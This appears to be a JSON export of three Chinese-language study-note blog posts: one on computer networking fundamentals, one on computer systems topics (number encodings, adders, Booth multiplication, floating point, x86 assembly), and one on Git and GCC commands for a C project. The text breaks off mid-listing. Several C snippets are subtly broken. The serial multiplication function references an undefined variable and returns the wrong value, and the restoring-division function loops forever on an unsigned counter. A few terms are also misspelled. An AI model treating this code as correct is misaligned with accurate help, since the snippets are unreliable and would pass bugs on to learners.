[{"content":"概述 网络构成 节点: 主机及进程(端系统, host/end system), 交换设备(路由器/交换机, switch). 边: 通信链路; 接入网链路(主机接入), 主干链路(交换设备间); 传输速率=带宽(bps). 协议(protocol): 对等层实体通信中遵循的规则集合; 格式(语法, 语义), 次序, 动作; TCP/IP(Transmission Control Protocol/Internet Protocol). 服务描述: 分布式应用进程; 提供接口(面向连接服务/无连接服务)的通信基础设施; 嵌套字接口(socket interface). 结构: 网络边缘(edge, 主机及进程); 网络核心(core, 交换设备及主干链路); 接入网及物理媒体(接入网链路). Internet: 网络的网络; 端系统经由ISP(Internet Service provider)接入, PoP(Point of Presence)接入上层ISP, IXP(Internet Exchange Point)ISP对等连接; 内容提供网络(content provider network); 局域网(LAN, Local Area Network), 城域网(MAN, Metropolitan), 广域网(WAN, Wide). Internet标准: IETF(Internet Engineering Task Force)-RFC(Request for comments). 网络边缘 客户端-服务器模式(client-service); 对等模式(peer-peer). 面向连接服务(connection-oriented): TCP[RFC 793]: 握手(数据传输前建立连接); 可靠保序(确认和重传), 流量控制(发送方不会淹没接收方), 拥塞控制(网络拥塞时发送方降低发送效率); HTTP(Web), FTP(文件传输), Talnet(远程登录), SMTP(E-mail). 无连接服务(connectionless): UDP[RFC 768]; 流媒体, 远程会议, DNS, Internet电话.\n网络核心-电路交换(circuit switching) 为呼叫预留端-端资源: 带宽(band-width)分片, 频分复用(Frequency-division multiplexing, FDM), 时分复用(TDM), 波分复用(WDM), 码分(CDM). 资源专用不共享, 呼叫无数据则资源片空闲(silent period), 呼叫要建立连接, 性能有保证. 不合适计算机间通信: 连接建立时间长, 共用时间 $=$ 建立连接时间 $+$ 传输时间; 通信有突发性, 资源浪费较多; 可靠性不高, 单点故障影响范围大. 网络核心-分组交换(packet) 以分组为单位存储-转发: 传输数据分组; 传输时使用全部带宽; 统计多路复用, 不固定的时分. 资源共享, 按需使用: 分组延时; 节点总时延(total nodal delay) $=$ 处理时延(processing) $+$ 传输(transmission) $+$ 排队(queuing) $+$ 传播(propagation). 处理时延: 分组每次移动称为一跳(hop), 转发前节点收到整个分组. 传输时延: 速率 $R$ bps 链路, 长度 $L$ bits 分组, 存储-转发延时为 $L/R$ s. 排队时延: 到达速率 $\u0026gt;$ 输出速率, 缓存用完时新到达分组被丢弃(drop)即丢包(loss); 链路宽度 $R$ bps, 分组长度 $L$ bits, 分组到达队列平均速率 $a$, 流量强度为 $0\u0026lt;La/R\u0026lt;1$. 传播时延: 物理链路长度 $d$ m, 物理媒体传播速度 $s$ mps, 传播延时为 $d/s$ s. 关键功能: 路由, 决定分组采用的源到目标的路径(路由算法-路由表); 转发. 同样网络资源(带宽)支持更多用户使用: 总用户数 $M$, 最大同时用户数 $N$, 排队延时发生概率 $1-\\sum_{i=0}^N\\tbinom{M}{i} p^i(1-p)^{M-i}$; 但过度使用会造成拥塞(congestion). 数据报(datagram): 目标地址决定下一跳, 路由无状态. 虚电路(virtual circuit): 呼叫时决定路径, 信令(Signaling)控制, 路由维持通信状态. 吞吐量(throughput): 瞬时(instantaneous), 平均; 取决于瓶颈链路(bottleneck link).\n1 2 3 # ICMP(Internet Control Message Protocol): Head-目标IP地址, TTL(Time To Live, 生存时间); Body-RTT(Round Trip Time, 往返时间), 目标端口不可达(destination port unreachable, 结束测试标识). traceroute target_name # linux tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name # windows 接入网: 接入带宽; 共享/独享. 调制解调器(modem, 电话线): 调制加载到音频信号上, 音频信号解调; 调频, 调幅, 调相位, 综合调制; 拨号(带宽最高56 Kpbs, 不能同时在线), DLS(Didital Subcriber Line, 上行最高 1Mbps, 下行最高 10Mbps). 同轴线缆(有线电视): FDM, 共享带宽, HFC(Hybrid Fiber Coax, 上行最高 2Mbps, 下行最高 30Mbps). 电缆(Cable Internet Access). 光纤到户(FTTH, Fiber To The Home). 无线: 无线LANs; 广域无线(Wide-Area), 电信运营商提供(cellular).\n物理媒体: 传输Bit; 物理链路. 导引型媒体: 双绞线(TP, 5类 100Mbps, 6类 10Gbps), 同轴电缆(双向; 基带 Ethernet, 宽带 HFC), 光缆(光脉冲, 高速, 低误码率, 安全). 非导引型媒体: 开放空间传播, 环境效应(反射, 吸收, 干扰); 地面微波, LAN(WiFi), 广域(3G, LTE, 4G, 5G), 卫星.\n协议层次 复杂网络分层, 通过接口利用下层提供的服务 SAP(Service Access Point), 层间交互形式为原语(primitive, 如Socket函数), 对等层交互为协议; 本层协议通过下层提供服务实现, 为上层协议提供更高级服务. 数据单元(DU, Data Unit): $n+1$ 层 IDU(Interface) $=$ ICI(Interface Control Information) + SDU(service), $n$ 层 PDU(protocol) $=$ Header $+$ SDU. Internet协议栈(TCP/IP模型): 应用层(报文, message), 传输层(段, segment, 进程到进程, 可靠通信服务), 网络层(分组/数据报, packet, 端到端), 链路层(帧, frame, 点到点), 物理层(bit). ISO-OSI参考模型: 应用层, 表示层(解释数据, 表示转换), 会话层(同步, 检查, 恢复, 会话管理), 传输层, 网络层, 链路层, 物理层. 封装(encapsulation): 源主机封装, 交换设备解封装再封装, 目标主机解封装.\n应用层 传输层 网络层-数据平面 网络层-控制平面 链路层-局域网 网络安全 ","date":"2023-12-06T00:00:00Z","permalink":"https://example.com/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"计算机网络基础"},{"content":"前置知识: C语言, 电路基础, 微积分, 代数学, 概率论.\n*号章节为私货内容.\n补充材料: C语言参考手册\n信息表示和处理 *信息论 *数字逻辑 $\\bar{ }$ 逻辑/按位非, $+$ 逻辑/按位或, $\\cdot$ 逻辑/按位与, $\\oplus$ 逻辑/按位异或; $\\ll^L_{(n)}$ 逻辑左移 $n$ 位, $\\ll_{(n)}$ 算术/按位左移 $n$ 位, $\\lll_{(n)}$ 逻辑循环左移 $n$ 位, $\\lll^\\alpha_{(n)}$ 算术/按位循环左移 $n$ 位. Bool 代数: $\\mathcal{B}=(\\{0,1\\},+,\\cdot)$, $b,c,d\\in \\{0,1\\}$. 恒等律: $b+0=b$, $b\\cdot 1=b$. 0-1 律: $b+1=1$, $b\\cdot 0=0$. 互补律: $b+\\overline{b}=1$, $b\\cdot\\overline{b}=0$. 交换律: $b+c=c+b$, $b\\cdot c=c\\cdot b$. 结合律: $b +(c+d)=(b+c)+d$, $b\\cdot (c\\cdot d)=(b\\cdot c)\\cdot d$. 分配律: $b\\cdot(c+d)=(b\\cdot c)+(b\\cdot d)$, $b+(c\\cdot d)=(b+c)\\cdot(b+d)$. DeMorgan 律: $\\overline{b+c}=\\overline{b}\\cdot\\overline{c}$, $\\overline{b\\cdot c}=\\overline{b}+\\overline{c}$. 反演律 (广义 DeMorgan 律): 反演式等于原逻辑式; 交换 $+$ 和 $\\cdot$, 所有变量取非. 对偶律: 相等逻辑式的对偶也相等; 交换 $+$ 和 $\\cdot$, 交换 $0$ 和 $1$. 不难发现 $b\\oplus c=(\\overline{b}\\cdot c)+(b\\cdot\\overline{c})$.\n有限域 ${\\rm GF}(2) = ({0,1},\\oplus, \\cdot)$, $a,b\\in GF(2)$. 注意到 $a+b=(a\\oplus b)\\oplus(a\\cdot b)$. ${\\rm GF}(2)^n = \\{(b_{n-1},\u0026hellip;,b_1,b_0)\\ |\\ b_i\\in GF(2)\\}$. ${\\rm GF}(2)[x]/\\langle p(x)\\rangle: ({\\rm deg}p=n)=\\{\\sum_{i=0}^{n-1}b_ix^i\\ |\\ b_i\\in GF(2)\\}$. 类似可将 Bool 代数扩展到 $n$ 位, 继而有逻辑函数 $f: \\mathcal{B}^n\\to \\mathcal{B}^m$.\n组合逻辑(combinational): 不包含存储器件, 对于相同的输入总能得到相同的输出. (assign 模块) 时序逻辑(sequential): 包含存储器件, 输出取决于输入和当前存储内容. (always 模块) 门电路: 实现逻辑函数的电路设备.\n译码器(decoder): $\\mathcal{B}^n\\to \\mathcal{B}^{2^n}$, $(x_{n-1},\u0026hellip;,x_1,x_0)\\mapsto (0,0,\u0026hellip;,0,y_{\\sum_{i=0}^{n-1} b_i2^i}=1,0,\u0026hellip;,0,0)$; 逆函数为解码器(encoder). 选择器(mux, Multiplexer): $\\mathcal{B}^{nm+\\lceil\\log_2 n\\rceil}\\to \\mathcal{B}^m$, $(X_{n-1},\u0026hellip;,X_1,X_0,S)\\mapsto X_{S\\ (2)}$. PLA(Programmable Logic Array): 只有一级与门和一级或门(非门位置任意); 析取(sum of product)-对与求或, 合取(product of sum)-对或求与. 无关项: 通过去除输出无关项和输出无关项简化逻辑式. 定点数表示与运算 十进制转换: $b_n\u0026hellip;b_1b_0.b_{-1}\u0026hellip;b_{-m}\\ (R)=\\sum_{i=-m}^n b_iR^i\\ (10)$.\n2 进制 8 进制 2 进制 16 进制 2 进制 16 进制 001 1 0001 1 1001 9 010 2 0010 2 1010 A 011 3 0011 3 1011 B 100 4 0100 4 1100 C 101 5 0101 5 1101 D 110 6 0110 6 1110 E 111 7 0111 7 1111 F 1000 8 二进制编码(BCD, Binary Coded Decimal): $\\{0,1\\}^n\\to \\{x\\in \\mathbb{Z}\\ |\\ T_{\\min}\\leq x\\leq T_{\\max}\\}$. 原码($n$ bit): $b_{n-1}b_{n-2}\u0026hellip;b_1b_0\\mapsto (-1)^{b_{n-1}}\\sum_{i=0}^{n-2} b_i2^i$; $\\ T_{\\min}=1-2^{n-1}$; $\\ T_{\\max}=2^{n-1}-1$; $\\ 00\u0026hellip;0\\mapsto +0$, $10\u0026hellip;0\\mapsto -0$. 补码: $0b_{n-2}\u0026hellip;b_1b_0\\mapsto \\sum_{i=0}^{n-2} b_i2^i$, $\\ 1b_{n-2}\u0026hellip;b_1b_0\\mapsto\\sum_{i=0}^{n-2} b_i2^i -2^n$; $\\ T_{\\min}=-2^{n-1}$; $\\ T_{\\max}=2^{n-1}-1$; $\\ 00\u0026hellip;0\\mapsto +0$, $11\u0026hellip;1\\mapsto -1$, $10\u0026hellip;0\\mapsto -2^{n-1}$; 双射. 反码: $0b_{n-2}\u0026hellip;b_1b_0\\mapsto \\sum_{i=0}^{n-2} b_i2^i$, $\\ 1b_{n-2}\u0026hellip;b_1b_0\\mapsto\\sum_{i=0}^{n-2} b_i2^i-2^n+1$; $\\ T_{\\min}=1-2^{n-1}$; $\\ T_{\\max}=2^{n-1}-1$; $\\ 00\u0026hellip;0\\mapsto +0$, $11\u0026hellip;1\\mapsto -0$. 移码: $b_{n-1}b_{n-1}\u0026hellip;b_1b_0\\mapsto \\sum_{i=0}^{n-1} b_i2^i -(2^{n-1}-1)$; $\\ T_{\\min}=-2^{n-1}+1$; $\\ T_{\\max}=2^{n-1}$; $\\ 01\u0026hellip;1\\mapsto 0$; 双射. 左移补 $0$; 逻辑右移补 $0$; 算术右移(按位右移)补最高位. 补码(C): $x\\gets \\sim x+1 \\iff x\\gets -x$.\n1 2 3 4 5 6 7 8 9 10 // 无符号型与带符号型转换 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;-1U = %u\\n\u0026#34;, -1); printf(\u0026#34;(int)2147483648U = %d\\n\u0026#34;, (int)2147483648U); printf(\u0026#34;-2147483647U = %u\\n\u0026#34;, -2147483647); printf(\u0026#34;-2147483647-1U = %u\\n\u0026#34;, -2147483647-1); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 // 扩展, 提升, 截断 #include \u0026lt;stdio.h\u0026gt; int main() { signed char a = -97; signed char b = -34; signed char c = a + b; int d = a + b; printf(\u0026#34;c=%d, d=%d\\n\u0026#34;, c, d); printf(\u0026#34;c=0x%x, d=0x%x\\n\u0026#34;, c, d); return 0; } 小端序(small-end): 字节低位在低地址, 高位在高地址; 绝大多数CPU采用. 大端序(big-end): 字节低位在高地址, 高位在低地址; 网络传输.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 测试字节序模式 #include \u0026lt;stdio.h\u0026gt; typedef union { int num; unsigned char ch; } End; int main() { End test = {0}; test.num = 0x12345678; printf(\u0026#34;%X\\n\u0026#34;, test.ch); return 0; } 异号相加, 同号相减, 永不溢出. 正溢: 正数相加为负, 即正数减负数为负. 负溢: 负数相加为正, 即负数减正数为正.\n半加器(HA, half adder): ${\\rm sum}=a\\oplus b$, $c=a\\cdot b$. 全加器(FA, full adder): ${\\rm sum}_{i}=a_i\\oplus b_i\\oplus c_i, {\\rm c_i}=(a_i\\oplus b_i)\\cdot c_{i-1}+a_i\\cdot b_i$. 带标志加法器: $(a,b,{\\rm SUB})\\mapsto ({\\rm sum}, {\\rm ZF}, {\\rm OF}, {\\rm SF}, {\\rm CF})$; ${\\rm SUB}=1$ 时为减法. 进位保留加法器(CAS, carry save adder): $(a,b,c)\\mapsto ({\\rm sum}, {\\rm carry})$, ${\\rm sum}=a\\oplus b\\oplus c$, ${\\rm carry}$, ${\\rm carry}=(a\\cdot b+b\\cdot c+c\\cdot a)\\ll_{(1)}$. 并行进位加法器: 记 $g_i=a_i\\cdot b_i$, $p_i=a_i\\oplus b_i$, 则 $c_i=g_i+p_ic_{i-1}$, 将 $c_{i-1}$ 依次展开. 分组跳跃加法器(并行串行相结合): 每 4bit 为一小组串行, 每 4 小组为一大组串行.\n加法器标志 为 $1$ 时含义 逻辑式($n$ bit) ZF 零标志 为 $0$ $\\overline{{\\rm sum}_{n-1}+\u0026hellip;+{\\rm sum}_0}$ OF 溢出标志 溢出(带符号); 最高位进位/错位(无符号) $c_{n-1}\\oplus c_{n-2}$ SF 符号标志 为负 ${\\rm sum}_{n-1}$ CF 进位/错位标志 溢出(无符号); 最高位进位/错位(带符号) $c_{n-1}\\oplus{\\rm SUB}$ 乘法: 补码 $x\\mapsto x({\\rm mod}\\ 2^n)$, 显然 $x({\\rm mod}\\ 2^n)\\times y({\\rm mod}\\ 2^n)=xy({\\rm mod}\\ 2^n)$. 短常数乘法: $a=\\sum_{i=0}^w b_i2^i$, 则 $ax=\\sum_{b_i \\ne 0}x\\ll_{(i)}$. Booth 乘法: 乘法中累加次数取决于乘数中 $1$ 的数量, 考虑到 $\u0026hellip;01\u0026hellip;10\u0026hellip;=\u0026hellip;10\u0026hellip;00\u0026hellip;-\u0026hellip;00\u0026hellip;01\u0026hellip;$ 可将任意连续 $w$ 次连续累加变为 2 数相减. 4-Booth 编码: 不妨设 $b=b_{2n-1}\u0026hellip;b_1b_0$, 有扩展 $\\dot{b}=b_{2n+1}b_{2n}b_{2n-1}\u0026hellip;b_1b_0b_{-1}$ 其中 $b_{2n+1}=b_{2n}=b_{2n-1},b_{-1}=0$, 则 $a\\times b=a\\times\\dot{b}=a\\times[\\sum_{i=0}^n(b_{2i-1}+b_{2i}-2b_{2i+1})]$. Wallace 树压缩: 多个 CSA 组成为树型结构, 三数一组并行迭代计算多个数相加. Booth 乘法器(muliplier): 乘数 4-Booth 编码 $\\to$ 生成部分积 $\\to$ Wallace 数压缩 $\\to$ 最后的 ${\\rm carry}$ 与 ${\\rm sum}$ 全加.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 串行乘法 int Multi(int n, int m) { int sum = 0, c = 31; while (n \u0026amp;\u0026amp; s) { if (n \u0026amp; 1) sum += m; m \u0026lt;\u0026lt;= 1, n \u0026gt;\u0026gt;= 1, --c; } return c; } // 短常数乘法 int Multi15(int n) { return (n \u0026lt;\u0026lt; 4) + ~n + 1; } 乘积项 $(b_{2i+1}b_{2i}b_{2i-1})$ 输出 乘积项 $(b_{2i+1}b_{2i}b_{2i-1})$ 输出 $000$ $0$ $100$ $-2a$ $001$ $a$ $101$ $-a$ $010$ $a$ $110$ $-a$ $011$ $2a$ $111$ $0$ 除法溢出 $T_{\\min}/(-1)\\to T_{\\min}$; 除 $0$ 异常. 无符号恢复余数除法 (restoring remainder): $a=qb+r$: 除数 $t\\gets b\u0026laquo;_{({\\rm count})}$, 被除数 $a\\gets a-t$: $a\\geq 0$, $q_i=1$; $a\u0026lt;0$, 恢复余数 $a\\gets a+t$; $n\\gets n-1$$ 直至 $t=0$, 此时 $r=a$. 不恢复余数除法: 在前者基础上, 改为判断余数与除数符号, 同号相减取 $1$, 异号相加取 $0$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // 恢复余数除法 unsigned DivR(unsigned m, unsigned n, unsigned cnt) { unsigned tmp, quot = 0; while(cnt \u0026gt;= 0) { tmp = n \u0026lt;\u0026lt; cnt, m -= tmp; if (m \u0026gt;= 0) quot += 0B01 \u0026lt;\u0026lt; cnt; if (m \u0026lt; 0) m += tmp; --cnt; } return quot; } // 不恢复余数除法 int Div(int m, int n, int cnt) { int tmp, quot = 0; while(cnt \u0026gt;= 0) { tmp = n \u0026lt;\u0026lt; cnt; if ((m \u0026amp; tmp) \u0026gt;\u0026gt; 31) m -= tmp, quot += 0B01 \u0026lt;\u0026lt; cnt; else m += tmp; --cnt; } return quot; } // 模 2 幂 int rempwr2(int x, int n) { int s = x \u0026gt;\u0026gt; 31; x = (x + s) ^ s; x \u0026amp;= ((~0) + (1 \u0026lt;\u0026lt; n)); return (x ^ s)+ ~s + 1; } 补充材料: 位运算妙用\n浮点数表示与运算 浮点数: $\\mathbb{R}\\mapsto \\{0,1\\}^w$, $x\\mapsto (s,e,d,R)\\mapsto s\\times\\sum_{i=-m}^0 d_iR^i\\times R^e=\\hat{x}$. 加法及乘法满足交换律, 但不满足结合律. ULP(units in last place): ${\\rm err}=|\\hat{x}-x/R^e|/R^m$.\n值类型 符号($1$ bit) 阶码($n$ bit) 尾数($m$ bit) 值(偏置 $E=2^{n-1}-1$) 规格化非零数 $0$ 或 $1$ $0\u0026lt;e\u0026lt;2^n-1$ 任意 $(-1)^s\\times2^{e-E}\\times(1.f)$ 正零 $0$ $0$ $0$ $+0$ 负零 $1$ $0$ $0$ $-0$ 正无穷大 $0$ 全 $1$, 即 $2^n-1$ $0$ $+\\infty$ 负无穷大 $1$ 全 $1$ $0$ $-\\infty$ 非规划化数 $0$ 或 $1$ $0$ 非 $0$ 下溢, $(-1)^s\\times2^{-E+1}\\times(0.f)$ 非数 $0$ 或 $1$ 全 $1$ 非 $0$ ${\\rm NaN}$ IEEE754: FP16 - $n=5$, $m=10$; FP32 - $n=8$, $m=23$; ${\\rm err}\u0026lt;1/2 {\\rm ULP}$. Google: BF16 - $n=8$, $m=7$; 可视为 FP32 尾数直接截断得到, 牺牲精度以扩大范围.\n加减法: 对阶(小阶向大阶对齐) $\\to$ 尾数加减 $\\to$ 左规(阶码递减; 下溢)/右规(阶码递增; 上溢; 舍入) $\\to$ 尾数舍入($0$ 舍 $1$ 入; 向 $+\\infty$ 舍入; 向 $-\\infty$ 舍入; 向 $0$ 舍入; 置 $1$; 截断) - 保护位(guard), 警戒位(round), 粘位(sticky); 溢出判断. 乘除法: 阶码加减(可能溢出) $\\to$ 尾数乘除 $\\to$ 规格化 $\\to$ 尾数舍入. Newton-Rahpson 方法: $f(x)=\\sum_{i=0}^{\\infty}f^i(x_0)(x-x_0)^i/i!=0$, 有迭代式 $x_{n+1}=x_n-f(x_n)/f\u0026rsquo;(x_n)$. 确保操作数均为规格化浮点数; 除 $0$ 得到无穷.\n*补充材料: COMPUTER ARITHMETIC: Algorithms and Hardware Designs\n程序的机器级表示 汇编基础 以 IA-32 为例, 比较 AT\u0026amp;T 和 Intel 风格.\n汇编指令: \u0026ldquo;[标签: ]指令助记符 [操作数助记符1] [操作数助记符2]\u0026rdquo; 指令类型: 传送(数据/地址/标志/IO); 定点算术运算(加减乘除/自增自减/取负/比较); 按位运算(逻辑/移位); 控制转移(无条件转移/条件转移/条件设置/条件传送/中断); x87 浮点数处理; MMX/SSE. 操作数类型: 立即数; 寄存器; 主存地址. 寄存器类型: 定点(通用; 指针指令; 标志/状态; 段); 浮点; MMX; x86-64(调试; 控制; 系统表指针; 特殊模块). 实模式寻址(兼容 8086/8088): (CS) $\\ll 4+$ (IP), 代码段寄存器, 偏移地址. 保护模式寻址(80286 及以上): 立即寻址; 寄存器寻址; 相对寻址 (PC) $+$ X, 程序计数器, 位移; 复杂寻址 (SR) $+$ (B) $+$ (I) $\\times$ S $+$ X, 段寄存器, 基址寄存器, 变址寄存器, 比例系数, 位移.\n通用数据传送: MOV, MOVS(符号扩展), MOVZ(零扩展), XCHG(数据交换), PUSH(压栈), POP(出栈). 地址传送: LEA(Load Effect Address), LDS, LSS. 标志传送: PUSHF, POPF. IO: IN, OUT. 定点算术运算: ADD, SUB, MUL, IMUL(带符号), DIV, IDIV(带符号), INC, DEC, NEG, CMP. 逻辑运算: NOT, AND, OR, XOR, TEST. 移位: SHL(逻辑), SHR(逻辑), SAL(算术), SAR(算术), ROL(循环), ROR(循环), RCL(带循环), RCR(带循环). 无条件转移: JMP(SHORT, NEAR, WORD, FAR, DWORD), CALL(NEAR, WORD, FAR, DWORD), RET. 条件设置: SET\u0026lt;flag\u0026gt;. 条件传送: CMOV\u0026lt;flag\u0026gt;. 中断: INT. 空操作: NOP.\n条件转移 转移标志 说明 取反 JC CF $=1$ 有进/错位 JNC JE/JZ ZF $=1$ 相等/等于 $0$ JNE/JNZ JS SF $=1$ 为负 JNS JO OF $=1$ 溢出 JNO JA/JNBE CF $=0$ AND ZF $=0$ 无符号大于 JBE/JNA JAE/JNB CF $=0$ OR ZF $=1$ 无符号大于等于 JB/JNAE JG/JNLE SF $=$ OF AND ZF $=0$ 带符号大于 JLE/JNG JGE/JNL SF $=$ OF OR ZF $=1$ 带符号大于等于 JL/JNGE 过程: 每个未运行完函数在内存中对应一个栈帧, 保存栈底, 栈顶, (被)调用者保存寄存器, (传入参数), (返回地址), (局部变量). 准备: 形成新栈底 (PUSH, MOV); 生成栈帧 (SUB; AND); 保存现场 (PUSH). 过程: 分配局部变量 (auto); 处理具体逻辑; 发生新调用时(准备参数, CALL); 准备返回值 (EAX). 结束: 出栈/销毁 (LEAVE; POP); 取返回地址返回 (RET).\n分支: 条件传送实现(避免跳转导致的流水线预测低效); jump-table 实现(switch-case); 条件转移实现. 循环: jump-to-middle 实现; guarded-do 实现. 数组/字符串/结构体/联合体: 连续内存, 首地址确定. 地址传参: 保存地址, 再由地址传值. 内存对齐: 结构体对齐到 4bytes; 堆栈边界对齐到 16bytes; 便于寻址和正确运行.\n汇编风格 AT\u0026amp;T Intel 操作数方向 op src,dst op dst,src 寄存器表示 %reg reg 立即数表示 $num num 主存地址表示 offset(%base,%index,scale) [base+index*scale+offset] 读写长度表示 -b, -w, -l byte, word, dword 编译选项 -m32 Defualt 指针大小 32bit 64bit 出入栈基本单位 32bit 64bit 函数传参 调用时压栈 寄存器优先 (rdi, rsi, rdx, rcx, r8, r9) 越界访问: 数组越界; 野指针. 缓冲区溢出: 堆溢出(篡改 hook); 栈溢出(不安全的读写函数); 内核. 避免缓冲区溢出: 避免使用不安全的函数; 启用 ASLR(Address Space Layout Randomization); 堆栈权限保护(读, 写, 执行权限分离); 溢出检测(canary). 反调试: 调试痕迹识别; 识别调试器行为; 干扰调试器功能.\n补充材料: GDB Documentation\n*补充材料: Intel 64 and IA-32 Manuals\n目标文件 源文件(.c) $-$ 预处理(prepress) $\\to$ (.i) $-$ 编译(compile) $\\to$ (.s) $-$ 汇编(assemble) $\\to$ 目标文件(.o) $-$ 链接(linke) $\\to$ 可执行文件. 目标文件类型: PE-COFF(Portable Executable-Common File Formart) - Windows; ELF(Executable Linkable Format) - Linux. ELF 文件类型 Linux 实例 Windows 实例 可重定位(Relocatable) .o .obj 可执行(Executable) 无扩展名/.out .exe 共享目标(Shared Object) .so .dll 核心转储(Core Dump) core dump - *补充资料: PE Format\n链接与装载 (elf) 静态链接: 地址和空间分配, 符号决议, 重定位 装载 动态链接\n硬件体系结构 指令系统 RISC-V\nCPU 流水线技术 流水线原理, 预测并行\n存储器层次结构 总线及I/O 系统抽象 进程 虚拟内存 并发 系统级I/O *补充材料: The Linux Programming Interface: A Linux and UNIX System Programming Handbook\n性能优化 编译基础 优化技巧 ","date":"2023-12-06T00:00:00Z","permalink":"https://example.com/p/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/","title":"计算机系统基础"},{"content":"\r系统: windows10 语言: C11 编译: GCC13.1.0 构建: CMake3.26 IDE: CLion2023.2.1 版本: Git2.41.0 文档: Doxygen1.9.8 OOP 由于C模拟OOP较为复杂, 此处仅简要记录, 实际开发未能使用.\nobject-oriented programming, 面向对象编程.\n对象: 某一类事物的抽象概念. 类: 对象的表现; 具有属性(变量)和方法(函数). 实例: 根据类构建出的具体事物. 封装: 不需要被外界访问的属性和方法私有化(private); 接口与实现分离, 只暴露接口, 无需关心实现; 良好封装可以解耦合. 继承: 从现有类构造出新的类, 属性和方法(protected)被继承; 破坏了封装, 父类实现对子类暴露; 强耦合, 父类改变时子类随之而变. 多态: 具体类型和方法在编程时不确定, 运行时(编译时)可选择多个状态并最终确定; 编译时多态即函数重载/符号重载.\nGit 记录快照和hash值.\nmodified \u0026ndash;(add)\u0026ndash;\u0026gt; staged \u0026ndash;(commit)\u0026ndash;\u0026gt; committed\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 # 配置 git config --list # 查看配置 --global user.name [\u0026#34;用户名\u0026#34;] --global user.email [邮箱] \u0026lt;key\u0026gt; # 查看某项配置 # 基本 git init git diff # 未暂存的改动 diff --staged # 或\u0026#34;--cached\u0026#34;, 已暂存的改动 git add [文件名] # 暂存, \u0026#34;.\u0026#34;通配 git status # 暂存文件 git reset [文件名] # 撤销暂存 git rm --cached [文件名] # 从暂存区移除 git commit -m \u0026#34;提交信息\u0026#34; --amend # 补充提交, 新提交覆盖旧提交 git rm -f [文件名] # 不再追踪 git log --patch # 提交记录, 补丁形式 --stat # 文件总结 --grep [字符串] # 提交说明中包含指定内容 -S [字符串] # 添加或删除内容中包含指定内容 -[n] # 最近的n条提交 --after [时间] # 指定时间后的提交 --before [时间] # 指定时间前的提交 --pretty=format:\u0026#34;%h - %cd, %s\u0026#34; --graph # 图形显示提交hash简写, 日期, 说明 git reset # 默认\u0026#34;--mixed\u0026#34;, 回滚, 差异放在工作区 --soft # 回滚, 差异放在暂存区 --hard # 回滚, 不保存差异 # .gitignore 忽略文件, glob模式匹配, !表示取反 # 远程仓库 git remote add [简称] [链接] -v # 远程简称和对应链接 rename [旧简称] [新简称] show [简称] remove [简称] # 移除 git clone [链接] [本地路径] git fetch [简称] # 拉取(不合并) git pull [简称] # 合并 git push [简称] [分支] # 提交 # 分支 git branch [分支] # 新建 git\tbranch -a # 查看全部 --merged # 查看已合并 --no-merged # 查看未合并 -d [分支] # 删除 git log --decorate # 各个分支所指对象 git checkout [分支] # 切换 -b [分支] # 新建并切换 git merge [合入分支] # 快速合并 --no-ff [合入分支] # 非快速合并, 合并到当前分支的新节点 --squash [合入分支] # 压缩合并, 合并到当前分支的新节点, 但不保留对合入分支的引用 --rebase [合入分支] # 变基合并, 合入分支变基到当前节点 git cherry-pick -[n] commit # 拣选n个节点合并 提交信息格式(推荐): \u0026ldquo;\u0026lt;type\u0026gt;(\u0026lt;scope\u0026gt;): \u0026lt;subject\u0026gt;\u0026rdquo; \u0026lt;type\u0026gt;: feat(feature) 新功能; fix/to 修复bug; docs 文档; style 修改格式; refactor 重构; perf 优化; test 增加测试; chore 构建过程或辅助工具变动; revert 回滚; merge 合并分支. \u0026lt;scope\u0026gt;: 影响范围.\n项目分支管理 (非快速合并)\n项目结构 函数接口 函数实现 头文件(.h) 源文件(.c)/静态链接库(.a/.lib)/动态链接库(.so/.ddl) 库文件: 目标文件(.o)的压缩. 静态链接库: 生成的可执行文件可独立运行; 重复调用的模块在链接时被多次复制, 造成代码冗余. 动态链接库(共享链接库): 链接时记录模块位置; 生成的可执行文件无法独立运行. 目录结构 xxx-build/: 构建和编译目录; 下有子目录debug/和release/;在clion中为自动生成; 一般无需追踪 .git/和.gitignore: 版本控制 dist/: 分发目录, 最终发布版本; 下可按版本号划分子目录 docs/: 文档目录 include/: 公共头文件目录; 下可按模块划分子目录 lib/: 外部依赖库目录 src/: 源文件目录; 与头文件目录同结构同名 samples/: 样例程序目录 tests/: 测试文件目录 tools/: 支撑工具目录 copyright: 版权声明文件 CMakeLists.txt或Makefile: 构建配置文件 README: 说明文件 GCC -\u0026gt; Makefile -\u0026gt; CMake 编译过程: .c \u0026ndash;(预处理)\u0026ndash;\u0026gt; .i \u0026ndash;(编译egcs)\u0026ndash;\u0026gt; .s \u0026ndash;(汇编as)\u0026ndash;\u0026gt; .o \u0026ndash;(链接ld)\u0026ndash;\u0026gt; 可执行文件.\n1 2 ar rcs [libxxx.a] [.o] # 生成静态链接库, 名称必须以\u0026#34;lib\u0026#34;开头, win下为\u0026#34;libxxx.lib\u0026#34; gcc -fPIC -shared [.c] -o [libxxx.so] # 生成动态链接库, 名称必须以\u0026#34;lib\u0026#34;开头, win下为\u0026#34;libxxx.dll\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 基本 gcc -E [.c] -o [.i] # 仅预处理, 需重定向输出 -S [.c/.i] -o [.s] # 预处理和编译, 生成.s -c [.c/.i/.s] -o [.o] # 预处理, 编译, 汇编, 生成.o [.c/.i/.s/.o] -o [out] # 预处理, 编译, 汇编, 生成可执行文件 -I [path] [.o] # 指明头文件路径 -staic [.o] [libxxx.a] # 链接静态库 -L [path] -l[xxx] # 指明静态库路径和静态库 [.c] [.so] -o [out] # 链接动态库 ldd [out] # 查看运行时所需的动态链接库及位置 # 